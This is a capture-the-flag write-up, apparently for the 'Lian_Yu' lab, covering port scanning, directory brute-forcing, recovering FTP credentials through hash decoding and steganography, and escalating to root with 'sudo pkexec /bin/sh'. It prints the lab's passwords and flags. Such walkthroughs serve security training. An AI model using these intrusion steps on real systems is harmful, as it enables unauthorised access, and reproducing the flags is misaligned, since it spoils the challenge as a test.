# Lian_Yu

--------------------------------------------------------------------

**TOOLS USED**: nmap, feroxbuster, gobuster, hexeditor, binwalk, exiftool

--------------------------------------------------------------------

## GIVEN INFO


**IP Address**: 10.10.13.58

--------------------------------------------------------------------

## PROCEDURE

### 1. RECON

-sC: script scan<br>
-sV: probe open ports to determine service/version info
```
nmap --sC -sV 10.10.13.58
```

![1.1](./imgs/1.1.png)

**EXPOSED PORT (SERVICE)**:<br>
    21 (ftp vsftpd 3.0.2)<br>
    22 (ssh OpenSSH 6.7p1),<br>
    80 (http Apache httpd),<br>
    111 (rcpbind 2-4)

Enumerate hidden directories on webserver
```
feroxbuster -u http://10.10.13.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![1.2](./imgs/1.2.png)

Directory of Interest: /island, /island/2100

Found codeword in /island<br>
**CODEWORD**: vigilante

![1.3](./imgs/1.3.png)

Need to get .ticket file

![1.4](./imgs/1.4.png)

Use feroxbuster to find files with .ticket extension<br>
-t THREADS (default 10)
```
gobuster dir -u http://10.10.13.58/island/2100 -x .ticket -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
```

![1.5](./imgs/1.5.png)

**FILE**:/green_arrow.ticket

![1.6](./imgs/1.6.png)

**TOKEN**: RTy8yhBQdscX

Tried using it as ftp password but didn't work<br>
Might be some type of hash

Use cyberchef to identify and crack it

![1.7](./imgs/1.7.png)

**PASSWORD**: !#th3h00d

### 2. FTP LOGIN

```
ftp vigilante@10.10.13.58
```

![2.1](./imgs/2.1.png)

Found images and files

```
cat .other_user
```

![2.9](./imgs/2.9.png)

**USERNAME**: slade

```
binwalk *
```

![2.2](./imgs/2.2.png)

```
exiftool *
```

Leave_me_alone.png has file format error

![2.3](./imgs/2.3.png)

Check header
```
hexeditor Leave_me_alone.png
```

![2.5](./imgs/2.5.png)

Correct png header
```
hexeditor Queen\'s_Gambit.png
```

![2.4](./imgs/2.4.png)

Edit header to match Queen's_Gambit.png

![2.6](./imgs/2.6.png)

Open image

![2.7](./imgs/2.7.png)

**PASSWORD**: password

Use this to unlock other images
```
steghide extract -sf aa.jpg
```

Found ss.zip

```
unzip ss.zip
```

![2.8](./imgs/2.8.png)

**PASSWORD**: M3tahuman

### SSH LOGIN

```
ssh slade@10.10.13.58
```

![3.1](./imgs/3.1.png)

**USER FLAG**: THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}

### 4. PRIVIEGE ESCALATION

Check privileges
```
sudo -l
```

![4.1](./imgs/4.1.png)

slade can run /usr/bin/pkexec as root

from https://gtfobins.github.io/gtfobins/pkexec/#sudo
```
sudo pkexec /bin/sh
```

![4.2](./imgs/4.2.png)

**ROOT FLAG**: THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}